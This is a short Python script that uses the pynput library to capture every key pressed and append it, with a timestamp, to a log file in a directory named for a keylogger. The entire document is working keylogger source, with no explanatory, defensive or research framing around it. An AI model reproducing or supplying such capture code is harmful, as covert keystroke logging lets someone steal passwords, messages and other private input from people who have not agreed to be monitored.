from pynput.keyboard import Key, Listener
import logging

log_dir = r"E:\projects\keylogger\\" 
log_file = "keylogs.txt"

logging.basicConfig(filename=(log_dir + log_file), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
